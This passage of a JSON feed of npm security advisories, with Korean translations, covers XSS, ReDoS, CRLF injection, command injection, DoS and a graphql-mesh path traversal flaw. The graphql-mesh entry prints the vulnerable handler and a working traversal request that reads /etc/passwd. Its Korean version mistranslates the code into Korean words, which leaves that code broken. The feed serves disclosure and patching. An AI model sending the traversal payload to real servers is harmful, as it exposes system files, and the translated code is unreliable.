    "description": "Mind-elixir is a free, open source mind map core. Prior to version 0.18.1, mind-elixir is prone to cross-site scripting when handling untrusted menus. This issue is patched in version 0.18.1.",
    "identifiers": "GHSA : GHSA-m22q-97p5-79v2\nCVE : CVE-2021-32851",
    "severity": "MODERATE",
    "updatedAt": "2023-02-22T00:11:37Z",
    "publishedAt": "2023-02-21T00:30:20Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-32851\nhttps://github.com/ssshooter/mind-elixir-core/commit/073485269ac83af24371f35bd08507defa885655\nhttps://github.com/ssshooter/mind-elixir-core/blob/79942a68b14c8875ab7d270b1ad25bfff351b04c/src/plugin/contextMenu.js#L13\nhttps://securitylab.github.com/advisories/GHSL-2021-1047_Mind-elixir/\nhttps://github.com/advisories/GHSA-m22q-97p5-79v2",
    "name": "mind-elixir",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.18.1",
    "identifier": "0.18.1",
    "descriptionKR": "Mind-elixir는 무료 오픈 소스 마인드 맵 코어입니다. 버전 0.18.1 이전에는 mind-elixir가 신뢰할 수 없는 메뉴를 처리할 때 교차 사이트 스크립팅이 발생하기 쉽습니다. 이 문제는 버전 0.18.1에서 패치되었습니다."
  },
  {
    "description": "textAngular is a text editor for Angular.js. Version 1.5.16 and prior are vulnerable to copy-paste cross-site scripting (XSS). For this particular type of XSS, the victim needs to be fooled into copying a malicious payload into the text editor. There are no known patches.",
    "identifiers": "GHSA : GHSA-7h4w-6p98-r3wx\nCVE : CVE-2021-32854",
    "severity": "MODERATE",
    "updatedAt": "2023-02-22T00:11:03Z",
    "publishedAt": "2023-02-21T15:30:23Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-32854\nhttps://securitylab.github.com/advisories/GHSL-2021-1001-textAngular/\nhttps://github.com/advisories/GHSA-7h4w-6p98-r3wx",
    "name": "textangular",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 1.5.16",
    "descriptionKR": "textAngular는 Angular.js용 텍스트 편집기입니다. 버전 1.5.16 및 이전 버전은 XSS(교차 사이트 스크립팅) 복사-붙여넣기에 취약합니다. 이 특정 유형의 XSS의 경우 피해자는 텍스트 편집기에 악성 페이로드를 복사하도록 속여야 합니다. 알려진 패치가 없습니다."
  },
  {
    "description": "Vditor is a browser-side Markdown editor. Versions prior to 3.8.7 are vulnerable to copy-paste cross-site scripting (XSS). For this particular type of XSS, the victim needs to be fooled into copying a malicious payload into the text editor. Version 3.8.7 contains a patch for this issue.",
    "identifiers": "GHSA : GHSA-vfmp-9999-6wqj\nCVE : CVE-2021-32855",
    "severity": "MODERATE",
    "updatedAt": "2023-02-22T00:10:53Z",
    "publishedAt": "2023-02-21T15:30:23Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-32855\nhttps://github.com/Vanessa219/vditor/issues/1085\nhttps://github.com/Vanessa219/vditor/commit/1b2382d7f8a4ee509d9245db4450d926a0b24146\nhttps://securitylab.github.com/advisories/GHSL-2021-1006-vditor/\nhttps://github.com/advisories/GHSA-vfmp-9999-6wqj",
    "name": "vditor",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 3.8.7",
    "identifier": "3.8.7",
    "descriptionKR": "Vditor는 브라우저 측 Markdown 편집기입니다. 3.8.7 이전 버전은 XSS(교차 사이트 스크립팅) 복사-붙여넣기에 취약합니다. 이 특정 유형의 XSS의 경우 피해자는 텍스트 편집기에 악성 페이로드를 복사하도록 속여야 합니다. 버전 3.8.7에는 이 문제에 대한 패치가 포함되어 있습니다."
  },
  {
    "description": "The Baremetrics date range picker is a solution for selecting both date ranges and single dates from a single calender view. Versions 1.0.14 and prior are prone to cross-site scripting (XSS) when handling untrusted `placeholder` entries. An attacker who is able to influence the field `placeholder` when creating a `Calendar` instance is able to supply arbitrary `html` or `javascript` that will be rendered in the context of a user leading to XSS. There are no known patches for this issue.",
    "identifiers": "GHSA : GHSA-465f-mxxh-grc4\nCVE : CVE-2021-32859",
    "severity": "MODERATE",
    "updatedAt": "2023-02-22T00:10:23Z",
    "publishedAt": "2023-02-21T15:30:23Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-32859\nhttps://github.com/Baremetrics/calendar/blob/240c20134ffbf0f0f246a50feff2be1ff19cf349/public/js/Calendar.js#L724\nhttps://securitylab.github.com/advisories/GHSL-2021-1042_Baremetrics_Date_Range_Picker/\nhttps://github.com/advisories/GHSA-465f-mxxh-grc4",
    "name": "baremetrics-calendar",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 1.0.14",
    "descriptionKR": "Baremetrics 날짜 범위 선택기는 단일 캘린더 보기에서 날짜 범위와 단일 날짜를 모두 선택하기 위한 솔루션입니다. 버전 1.0.14 및 이전 버전은 신뢰할 수 없는 'placeholder' 항목을 처리할 때 교차 사이트 스크립팅(XSS)이 발생하기 쉽습니다. 'Calendar' 인스턴스를 생성할 때 'placeholder' 필드에 영향을 미칠 수 있는 공격자는 XSS로 연결되는 사용자의 컨텍스트에서 렌더링될 임의의 'html' 또는 'javascript'를 제공할 수 있습니다. 이 문제에 대해 알려진 패치가 없습니다."
  },
  {
    "description": "iziModal is a modal plugin with jQuery. Versions prior to 1.6.1 are vulnerable to cross-site scripting (XSS) when handling untrusted modal titles. An attacker who is able to influence the field `title` when creating a `iziModal` instance is able to supply arbitrary `html` or `javascript` code that will be rendered in the context of a user, potentially leading to `XSS`. Version 1.6.1 contains a patch for this issue",
    "identifiers": "GHSA : GHSA-h685-83w4-3ph3\nCVE : CVE-2021-32860",
    "severity": "MODERATE",
    "updatedAt": "2023-02-22T00:10:04Z",
    "publishedAt": "2023-02-21T15:30:23Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-32860\nhttps://github.com/marcelodolza/iziModal/issues/249\nhttps://github.com/marcelodolza/iziModal/commit/01728ac52bac5c1b4512087dafe0ad8b091fdc9e\nhttps://securitylab.github.com/advisories/GHSL-2021-1044_iziModal/\nhttps://github.com/advisories/GHSA-h685-83w4-3ph3",
    "name": "izimodal",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.6.1",
    "identifier": "1.6.1",
    "descriptionKR": "iziModal은 jQuery가 포함된 모달 플러그인입니다. 1.6.1 이전 버전은 신뢰할 수 없는 모달 제목을 처리할 때 교차 사이트 스크립팅(XSS)에 취약합니다. 'iziModal' 인스턴스를 생성할 때 'title' 필드에 영향을 미칠 수 있는 공격자는 사용자 컨텍스트에서 렌더링될 임의의 'html' 또는 'javascript' 코드를 제공할 수 있으며 잠재적으로 'XSS'로 이어질 수 있습니다. 버전 1.6.1에는 이 문제에 대한 패치가 포함되어 있습니다."
  },
  {
    "description": "jQuery MiniColors is a color picker built on jQuery. Prior to version 2.3.6, jQuery MiniColors is prone to cross-site scripting when handling untrusted color names. This issue is patched in version 2.3.6.",
    "identifiers": "GHSA : GHSA-crh5-vv2v-c82q\nCVE : CVE-2021-32850",
    "severity": "MODERATE",
    "updatedAt": "2023-06-12T16:44:22Z",
    "publishedAt": "2023-02-21T00:30:20Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-32850\nhttps://github.com/claviska/jquery-minicolors/commit/ef134824a7f4110ada53ea6c173111a4fa2f48f3\nhttps://github.com/claviska/jquery-minicolors/releases/tag/2.3.6\nhttps://securitylab.github.com/advisories/GHSL-2021-1045_jQuery_MiniColors_Plugin/\nhttps://codepen.io/webbiesdk/pen/oNBQNNV\nhttps://vuldb.com/?ctiid.215306\nhttps://vuldb.com/?id.215306\nhttps://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/MC5HV4ESLV2E23YGHNJ542QEZBH6YE2F/\nhttps://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/UDXBWA54A7D6HMR2TN5BAYNCU7HO2PUO/\nhttps://github.com/advisories/GHSA-crh5-vv2v-c82q",
    "name": "@claviska/jquery-minicolors",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 2.3.6",
    "identifier": "2.3.6",
    "descriptionKR": "jQuery MiniColors는 jQuery를 기반으로 하는 색상 선택기입니다. 버전 2.3.6 이전에는 jQuery MiniColors가 신뢰할 수 없는 색상 이름을 처리할 때 교차 사이트 스크립팅이 발생하기 쉽습니다. 이 문제는 버전 2.3.6에서 패치되었습니다."
  },
  {
    "description": "A vulnerability, which was classified as problematic, was found in generator-hottowel 0.0.11. Affected is an unknown function of the file app/templates/src/server/_app.js of the component 404 Error Handler. The manipulation leads to cross site scripting. It is possible to launch the attack remotely. The name of the patch is c17092fd4103143a9ddab93c8983ace8bf174396. It is recommended to apply a patch to fix this issue. The identifier of this vulnerability is VDB-221484.",
    "identifiers": "GHSA : GHSA-f8hv-rx9p-f9r4\nCVE : CVE-2016-15025",
    "severity": "MODERATE",
    "updatedAt": "2023-03-02T19:55:15Z",
    "publishedAt": "2023-02-20T12:30:18Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2016-15025\nhttps://github.com/johnpapa/generator-hottowel/pull/174\nhttps://github.com/johnpapa/generator-hottowel/commit/c17092fd4103143a9ddab93c8983ace8bf174396\nhttps://vuldb.com/?ctiid.221484\nhttps://vuldb.com/?id.221484\nhttps://github.com/advisories/GHSA-f8hv-rx9p-f9r4",
    "name": "generator-hottowel",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.5.0",
    "identifier": "0.5.0",
    "descriptionKR": "문제성으로 분류된 취약점이 generator-hottowel 0.0.11에서 발견되었습니다. 영향을 받는 것은 구성 요소 404 오류 처리기의 app/templates/src/server/_app.js 파일의 알 수 없는 기능입니다. 조작은 교차 사이트 스크립팅으로 이어집니다. 공격을 원격으로 시작할 수 있습니다. 패치 이름은 c17092fd4103143a9ddab93c8983ace8bf174396입니다. 이 문제를 해결하려면 패치를 적용하는 것이 좋습니다. 이 취약점의 식별자는 VDB-221484입니다."
  },
  {
    "description": "### Impact\n\nCommand Injection Vulnerability. All versions <1.1.0 are affected.\n \n### Patches\n\nPlease upgrade to versionn@1.1.0",
    "identifiers": "GHSA : GHSA-fj78-2vc5-f6cm\nCVE : CVE-2023-25805",
    "severity": "CRITICAL",
    "updatedAt": "2023-02-22T00:05:07Z",
    "publishedAt": "2023-02-22T00:05:05Z",
    "references": "https://github.com/commenthol/versionn/security/advisories/GHSA-fj78-2vc5-f6cm\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-25805\nhttps://github.com/commenthol/versionn/commit/2ca128823efe962b37f2698f0eb530c2b124842d\nhttps://github.com/advisories/GHSA-fj78-2vc5-f6cm",
    "name": "versionn",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.1.0",
    "identifier": "1.1.0",
    "descriptionKR": "### 영향\n\n명령 주입 취약점. 1.1.0 미만의 모든 버전이 영향을 받습니다.\n \n### 패치\n\nversionn@1.1.0으로 업그레이드하십시오."
  },
  {
    "description": "## This advisory is withdawn.\n\ncacheable-request depends on http-cache-semanttics, which contains an Inefficient Regular Expression Complexity in versions prior to 4.1.1 of that package. cacheable-request has been updated to rely on the fixed version in 10.2.7. \n\n### Summary of http-cache-semantics vulnerability\nhttp-cache semantics contains an Inefficient Regular Expression Complexity , leading to Denial of Service. This affects versions of the package http-cache-semantics before 4.1.1. The issue can be exploited via malicious request header values sent to a server, when that server reads the cache policy from the request using this library.\n\n### Details\nhttps://github.com/advisories/GHSA-rc47-6667-2j5j\n\n",
    "identifiers": "GHSA : GHSA-8x6c-cv3v-vp6g",
    "severity": "HIGH",
    "updatedAt": "2023-02-21T05:06:46Z",
    "publishedAt": "2023-02-11T00:13:31Z",
    "withdrawnAt": "2023-02-14T02:40:00Z",
    "references": "https://github.com/jaredwray/cacheable-request/security/advisories/GHSA-8x6c-cv3v-vp6g\nhttps://github.com/jaredwray/cacheable-request/commit/8a47777e4eb61960469873cf4b3a2823742fc15e\nhttps://github.com/advisories/GHSA-rc47-6667-2j5j\nhttps://github.com/advisories/GHSA-8x6c-cv3v-vp6g",
    "name": "cacheable-request",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 10.2.7",
    "identifier": "10.2.7",
    "descriptionKR": "## 이 권고는 철회되었습니다.\n\ncacheable-request는 해당 패키지의 4.1.1 이전 버전에서 비효율적인 정규식 복잡성을 포함하는 http-cache-semanttics에 의존합니다. 캐시 가능한 요청이 10.2.7의 수정된 버전에 의존하도록 업데이트되었습니다.\n\n### http-cache-semantics 취약점 요약\nhttp-cache 의미론에는 서비스 거부로 이어지는 비효율적인 정규식 복잡성이 포함되어 있습니다. 이는 4.1.1 이전의 패키지 http-cache-semantics 버전에 영향을 미칩니다. 이 문제는 서버가 이 라이브러리를 사용하여 요청에서 캐시 정책을 읽을 때 서버로 전송되는 악의적인 요청 헤더 값을 통해 악용될 수 있습니다.\n\n### 세부 정보\nhttps://github.com/advisories/GHSA-rc47-6667-2j5j"
  },
  {
    "description": "The dropdown menu in jspreadsheet before v4.6.0 was discovered to be vulnerable to cross-site scripting (XSS).",
    "identifiers": "GHSA : GHSA-q82h-q47j-f492\nCVE : CVE-2022-48115",
    "severity": "MODERATE",
    "updatedAt": "2023-03-01T01:48:47Z",
    "publishedAt": "2023-02-18T00:31:59Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-48115\nhttps://github.com/jspreadsheet/ce/issues/1587\nhttps://github.com/jspreadsheet/ce\nhttps://github.com/advisories/GHSA-q82h-q47j-f492",
    "name": "jspreadsheet-ce",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 4.6.0",
    "identifier": "4.6.0",
    "descriptionKR": "v4.6.0 이전 jspreadsheet의 드롭다운 메뉴는 XSS(교차 사이트 스크립팅)에 취약한 것으로 발견되었습니다."
  },
  {
    "description": "### Impact\nThe `Headers.set()` and `Headers.append()` methods are vulnerable to Regular Expression Denial of Service (ReDoS) attacks when untrusted values are passed into the functions. This is due to the inefficient regular expression used to normalize the values in the `headerValueNormalize()` utility function.\n\n### Patches\n\nThis vulnerability was patched in v5.19.1.\n\n### Workarounds\nThere is no workaround. Please update to an unaffected version.\n\n### References\n\n* https://hackerone.com/bugs?report_id=1784449\n\n### Credits\n\nCarter Snook reported this vulnerability.\n",
    "identifiers": "GHSA : GHSA-r6ch-mqf9-qc9w\nCVE : CVE-2023-24807",
    "severity": "HIGH",
    "updatedAt": "2023-02-16T20:46:56Z",
    "publishedAt": "2023-02-16T20:46:10Z",
    "references": "https://github.com/nodejs/undici/security/advisories/GHSA-r6ch-mqf9-qc9w\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-24807\nhttps://github.com/nodejs/undici/commit/f2324e549943f0b0937b09fb1c0c16cc7c93abdf\nhttps://github.com/nodejs/undici/releases/tag/v5.19.1\nhttps://hackerone.com/bugs?report_id=1784449\nhttps://github.com/advisories/GHSA-r6ch-mqf9-qc9w",
    "name": "undici",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 5.19.1",
    "identifier": "5.19.1",
    "descriptionKR": "### 영향\n`Headers.set()` 및 `Headers.append()` 메서드는 신뢰할 수 없는 값이 함수에 전달될 때 정규식 서비스 거부(ReDoS) 공격에 취약합니다. 이는 `headerValueNormalize()` 유틸리티 함수의 값을 정규화하는 데 사용되는 비효율적인 정규식 때문입니다.\n\n### 패치\n\n이 취약점은 v5.19.1에서 패치되었습니다.\n\n### 해결 방법\n해결 방법이 없습니다. 영향을 받지 않는 버전으로 업데이트하십시오.\n\n### 참조\n\n* https://hackerone.com/bugs?report_id=1784449\n\n### 크레딧\n\nCarter Snook이 이 취약점을 보고했습니다."
  },
  {
    "description": "### Impact\n\nundici library does not protect `host` HTTP header from CRLF injection vulnerabilities.\n\n### Patches\n\nThis issue was patched in Undici v5.19.1.\n\n### Workarounds\n\nSanitize the `headers.host` string before passing to undici.\n\n### References\n\nReported at https://hackerone.com/reports/1820955.\n\n### Credits\n\nThank you to Zhipeng Zhang ([@timon8](https://hackerone.com/timon8)) for reporting this vulnerability. ",
    "identifiers": "GHSA : GHSA-5r9g-qh6m-jxff\nCVE : CVE-2023-23936",
    "severity": "MODERATE",
    "updatedAt": "2023-02-24T21:40:36Z",
    "publishedAt": "2023-02-16T20:46:30Z",
    "references": "https://github.com/nodejs/undici/security/advisories/GHSA-5r9g-qh6m-jxff\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-23936\nhttps://github.com/nodejs/undici/commit/a2eff05401358f6595138df963837c24348f2034\nhttps://hackerone.com/reports/1820955\nhttps://github.com/nodejs/undici/releases/tag/v5.19.1\nhttps://github.com/advisories/GHSA-5r9g-qh6m-jxff",
    "name": "undici",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 2.0.0, < 5.19.1",
    "identifier": "5.19.1",
    "descriptionKR": "### 영향\n\nundici 라이브러리는 CRLF 인젝션 취약점으로부터 `host` HTTP 헤더를 보호하지 않습니다.\n\n### 패치\n\n이 문제는 Undici v5.19.1에서 패치되었습니다.\n\n### 해결 방법\n\nundici에 전달하기 전에 `headers.host` 문자열을 삭제합니다.\n\n### 참조\n\nhttps://hackerone.com/reports/1820955에서 보고되었습니다.\n\n### 크레딧\n\n이 취약점을 보고해 주신 Zhipeng Zhang([@timon8](https://hackerone.com/timon8))에게 감사드립니다."
  },
  {
    "description": "### Description\n\nWhen using the non-default \"fallback\" crypto back-end, ECC operations in `node-jose` can trigger a Denial-of-Service (DoS) condition, due to a possible infinite loop in an internal calculation.  For some ECC operations, this condition is triggered randomly; for others, it can be triggered by malicious input.\n\n#### Technical summary\n\nThe JOSE logic implemented by `node-jose` usually relies on an external cryptographic library for the underlying cryptographic primitives that JOSE operations require.  When WebCrypto or the Node `crypto` module are available, they are used.  When neither of these libraries is available, `node-jose` includes its own \"fallback\" implementations of some algorithms based on `node-forge`, in particular implementations of ECDH and ECDSA. \n\nA various points, these algorithm implementations need to compute to the X coordinate of an elliptic curve point.  This is done by calling the `getX()` method of the object representing the point, which is an alias of the function `pointFpGetX()` in `lib/deps/ecc/math.js`.\n\nComputing the X coordinate from the form in which the point is stored requires computing the modular inverse of the Z coordinate, using the `modInverse` function from the `jsbn` library (e.g., `this.z.modInverse(this.curve.p)`).  The output of this function call is multiplied by another value before being reduced with the `barrettReduce()` function.\n\nThe root cause of this issue is that the `jsbn` `modInverse` function sometimes returns negative results.  These results are correct in that they are equivalent mod the relevant modulus, but can be problematic for functions that expect modular operations to always return positive results (in the range `[0, p)`, where `p` is the modulus).\n\nIn particular, while the Barrett reduction algorithm in general can handle negative inputs, the implementation in `node-jose` explicitly does not. Therefore, while the negative value that is returned by `modInverse()` is mathematically correct, it leads to an error in `barrettReduce()` causing an infinite loop which may result in a Denial of Service condition.\n\nFor a given prime modulus, we estimate that roughly one in every `2^20` inputs produce a negative `modInverse()`.  This estimate was validated with exhaustive testing on small primes (<30 bits) and randomized testing with regard to the P-256 prime.\n\n### Impact\n\nThis issue is only present in situations where the \"fallback\" cryptographic implementation is being used, i.e., situations where neither WebCrypto nor the Node `crypto` module is available.\n\nThe following elliptic curve algorithms are impacted by this issue (all in `lib/deps/ecc/index.js`):\n\n- Elliptic curve key generation (`exports.generateKeyPair`)\n- Converting an elliptic curve private key to a public key (`ECPrivateKey.prototype.toPublicKey`)\n- ECDSA signing (`ECPrivateKey.prototype.sign`)\n- ECDSA verification (`ECPublicKey.prototype.verify`)\n- ECDH key agreement (`ECPrivateKey.prototype.computeSecret`)\n\nIn the first three cases, the points being evaluated are generated randomly, so an attack could only arise due to a bad value being randomly selected (as noted above, with probability roughly `2^{-20}`).  In the latter two cases, the points being evaluated are provided from outside the library, and thus potentially by attackers.\n\n### Patches\n\n_Has the problem been patched? What versions should users upgrade to?_\n\n### Workarounds\n\nSince this issue is only present in the \"fallback\" crypto implementation, it can be avoided by ensuring that either WebCrypto or the Node `crypto` module is available in the JS environment where `node-jose` is being run.\n\n### References\n\n- [Barrett reduction on Wikipedia](https://en.wikipedia.org/wiki/Barrett_reduction)\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n* Open an issue in [cisco/node-jose](https://github.com/cisco/node-jose/issues)\n* Email [Cisco open source security](mailto:oss-security@cisco.com)\n\n### Credits\n\n- Research and disclosure: BlackBerry\n- Fix implementation: [Richard Barnes (@bifurcation)](https://github.com/bifurcation)\n- Release engineering: [Stephen Augustus (@justaugustus)](https://github.com/justaugustus)\n",
    "identifiers": "GHSA : GHSA-5h4j-qrvg-9xhw\nCVE : CVE-2023-25653",
    "severity": "HIGH",
    "updatedAt": "2023-02-16T21:52:41Z",
    "publishedAt": "2023-02-16T18:44:47Z",
    "references": "https://github.com/cisco/node-jose/security/advisories/GHSA-5h4j-qrvg-9xhw\nhttps://github.com/cisco/node-jose/commit/901d91508a70e3b9bdfc45688ea07bb4e1b8210d\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-25653\nhttps://github.com/advisories/GHSA-5h4j-qrvg-9xhw",
    "name": "node-jose",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 2.2.0",
    "identifier": "2.2.0",
    "descriptionKR": "### 설명\n\n기본이 아닌 \"폴백\" 암호화 백엔드를 사용하는 경우 `node-jose`의 ECC 작업은 내부 계산의 가능한 무한 루프로 인해 서비스 거부(DoS) 조건을 트리거할 수 있습니다. 일부 ECC 작업의 경우 이 조건이 임의로 트리거됩니다. 다른 사람들에게는 악의적인 입력에 의해 트리거될 수 있습니다.\n\n#### 기술 요약\n\n`node-jose`에 의해 구현된 JOSE 논리는 일반적으로 JOSE 작업에 필요한 기본 암호화 프리미티브에 대해 외부 암호화 라이브러리에 의존합니다. WebCrypto 또는 Node `crypto` 모듈이 사용 가능한 경우 사용됩니다. 이러한 라이브러리를 모두 사용할 수 없는 경우 `node-jose`에는 `node-forge`를 기반으로 하는 일부 알고리즘, 특히 ECDH 및 ECDSA 구현의 자체 \"대체\" 구현이 포함됩니다.\n\n다양한 점, 이러한 알고리즘 구현은 타원 곡선 점의 X 좌표를 계산해야 합니다. 이는 `lib/deps/ecc/math.js`에서 `pointFpGetX()` 함수의 별칭인 점을 나타내는 개체의 `getX()` 메서드를 호출하여 수행됩니다.\n\n포인트가 저장된 형태에서 X 좌표를 계산하려면 `jsbn` 라이브러리의 `modInverse` 함수를 사용하여 Z 좌표의 모듈러 역수를 계산해야 합니다(예: `this.z.modInverse(this.curve.p )`). 이 함수 호출의 출력은 `barrettReduce()` 함수로 축소되기 전에 다른 값으로 곱해집니다.\n\n이 문제의 근본 원인은 `jsbn` `modInverse` 함수가 때때로 부정적인 결과를 반환하기 때문입니다. 이러한 결과는 관련 모듈러스와 동일하다는 점에서 정확하지만 모듈 연산이 항상 긍정적인 결과를 반환할 것으로 예상하는 함수(`p`가 모듈러스인 경우 `[0, p)` 범위에서)에 문제가 될 수 있습니다.\n\n특히 일반적으로 Barrett 감소 알고리즘은 음수 입력을 처리할 수 있지만 `node-jose`의 구현은 명시적으로 처리하지 않습니다. 따라서 `modInverse()`에 의해 반환된 음수 값은 수학적으로 정확하지만 `barrettReduce()`에서 오류가 발생하여 서비스 거부 상태가 발생할 수 있는 무한 루프를 발생시킵니다.\n\n주어진 소수 모듈러스에 대해 대략 모든 `2^20` 입력 중 하나가 음의 `modInverse()`를 생성한다고 추정합니다. 이 추정치는 작은 프라임(<30비트)에 대한 철저한 테스트와 P-256 프라임에 대한 무작위 테스트를 통해 검증되었습니다.\n\n### 영향\n\n이 문제는 \"대체\" 암호화 구현이 사용되는 상황, 즉 WebCrypto와 Node `crypto` 모듈을 모두 사용할 수 없는 상황에서만 나타납니다.\n\n다음 타원 곡선 알고리즘은 이 문제의 영향을 받습니다(모두 `lib/deps/ecc/index.js`에 있음).\n\n- 타원 곡선 키 생성(`exports.generateKeyPair`)\n- 타원곡선 개인키를 공개키로 변환 (`ECPrivateKey.prototype.toPublicKey`)\n- ECDSA 서명(`ECPrivateKey.prototype.sign`)\n- ECDSA 인증(`ECPublicKey.prototype.verify`)\n- ECDH 키 동의(`ECPrivateKey.prototype.computeSecret`)\n\n처음 세 가지 경우에서 평가되는 포인트는 무작위로 생성되므로 잘못된 값이 무작위로 선택되는 경우에만 공격이 발생할 수 있습니다(위에서 언급한 바와 같이 확률은 대략 `2^{-20}`). 후자의 두 경우에서 평가되는 포인트는 라이브러리 외부에서 제공되므로 잠재적으로 공격자에 의해 제공됩니다.\n\n### 패치\n\n_문제가 패치되었나요? 사용자는 어떤 버전으로 업그레이드해야 합니까?_\n\n### 해결 방법\n\n이 문제는 \"대체\" 암호화 구현에만 존재하기 때문에 'node-jose'가 실행되는 JS 환경에서 WebCrypto 또는 Node 'crypto' 모듈을 사용할 수 있는지 확인하여 피할 수 있습니다.\n\n### 참조\n\n- [위키피디아의 Barrett 감소](https://en.wikipedia.org/wiki/Barrett_reduction)\n\n### 자세한 내용은\n\n이 권고에 대한 질문이나 의견이 있는 경우:\n* [cisco/node-jose](https://github.com/cisco/node-jose/issues)에서 이슈 열기\n* 이메일 [Cisco 오픈 소스 보안](mailto:oss-security@cisco.com)\n\n### 크레딧\n\n- 연구 및 공개: 블랙베리\n- 구현 수정: [Richard Barnes(@bifurcation)](https://github.com/bifurcation)\n- 릴리스 엔지니어링: [Stephen Augustus(@justaugustus)](https://github.com/justaugustus)"
  },
  {
    "description": "### Summary\nMissing check vulnerability in the static file handler allows any client to access the files in the server's file system\n\n### Details\nWhen `staticFiles` is set in the `serve` settings in the configuration file, the following handler doesn't check if `absolutePath` is still under the directory provided as `staticFiles`;\n\n```ts\n  if (staticFiles) {\n    router.get('/:relativePath+', async request => {\n      let { relativePath } = request.params;\n      if (!relativePath) {\n        relativePath = 'index.html';\n      }\n      const absolutePath = path.join(baseDir, staticFiles, relativePath);\n      if (absolutePath.includes(staticFiles) && (await pathExists(absolutePath))) {\n        const readStream = fs.createReadStream(absolutePath);\n        return new Response(readStream as any, {\n          status: 200,\n        });\n      }\n      return undefined;\n    });\n ```\n\n### Example scenario\nTo reproduce it, set `staticFiles` to the relative path of a directory in `.meshrc.yml`;\n\n```yml\nserve:\n   staticFiles: ./public\n```\n\nThen start the server with `mesh dev`, and browse to `/..%2fpackage.json` then you will see the content of `package.json`. You can even go deeper to see sensitive data; `/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd`\n\n### Impact and solution\nIf `staticFiles` is set under `serve` in the configuration file. you have two options to fix vulnerability;\n\n- Update `@graphql-mesh/cli` to a version higher than `0.82.21`, and if you use `@graphql-mesh/http`, update it to a version higher than `0.3.18`\n- Remove `staticFiles` option from the configuration, and use other solutions to serve static files.\n\n### Credits\nThanks [alanwillms@gmail.com](mailto:alanwillms@gmail.com) for reporting this vulnerability with details",
    "identifiers": "GHSA : GHSA-j2wh-wrv3-4x4g",
    "severity": "MODERATE",
    "updatedAt": "2023-02-16T18:41:08Z",
    "publishedAt": "2023-02-16T18:41:07Z",
    "references": "https://github.com/Urigo/graphql-mesh/security/advisories/GHSA-j2wh-wrv3-4x4g\nhttps://github.com/Urigo/graphql-mesh/commit/95d93e7c140c2995b37e9d822aa3fe4e24ed2e78\nhttps://github.com/advisories/GHSA-j2wh-wrv3-4x4g",
    "name": "@graphql-mesh/http",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.3.19",
    "identifier": "0.3.19",
    "descriptionKR": "### 요약\n정적 파일 처리기의 누락 확인 취약점으로 인해 모든 클라이언트가 서버의 파일 시스템에 있는 파일에 액세스할 수 있습니다.\n\n### 세부 정보\n구성 파일의 `serve` 설정에서 `staticFiles`가 설정되면 다음 핸들러는 `absolutePath`가 여전히 `staticFiles`로 제공된 디렉토리 아래에 있는지 확인하지 않습니다.\n\n```ts\n  if(정적 파일) {\n    router.get('/:relativePath+', 비동기 요청 => {\n      let {relativePath} = request.params;\n      if (!relativePath) {\n        상대경로 = 'index.html';\n      }\n      const absolutePath = path.join(baseDir, staticFiles, relativePath);\n      if (absolutePath.includes(staticFiles) && (await pathExists(absolutePath))) {\n        const readStream = fs.createReadStream(absolutePath);\n        새로운 응답을 반환(readStream as any, {\n          상태: 200,\n        });\n      }\n      정의되지 않은 반환;\n    });\n ```\n\n### 예제 시나리오\n이를 재현하려면 `staticFiles`를 `.meshrc.yml`에 있는 디렉토리의 상대 경로로 설정하십시오.\n\n```yml\n제공하다:\n   정적 파일: ./public\n```\n\n그런 다음 `mesh dev`로 서버를 시작하고 `/..%2fpackage.json`으로 이동하면 `package.json`의 내용이 표시됩니다. 민감한 데이터를 보기 위해 더 깊이 들어갈 수도 있습니다. `/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc /passwd`\n\n### 영향 및 솔루션\n구성 파일의 `serve` 아래에 `staticFiles`가 설정된 경우. 취약점을 수정하는 두 가지 옵션이 있습니다.\n\n- `@graphql-mesh/cli`를 `0.82.21` 이상으로 업데이트하고 `@graphql-mesh/http`를 사용하는 경우 `0.3.18` 이상으로 업데이트\n- 구성에서 `staticFiles` 옵션을 제거하고 다른 솔루션을 사용하여 정적 파일을 제공합니다.\n\n### 크레딧\n이 취약점을 자세히 보고해 주신 [alanwillms@gmail.com](mailto:alanwillms@gmail.com)에게 감사드립니다."
  },
  {
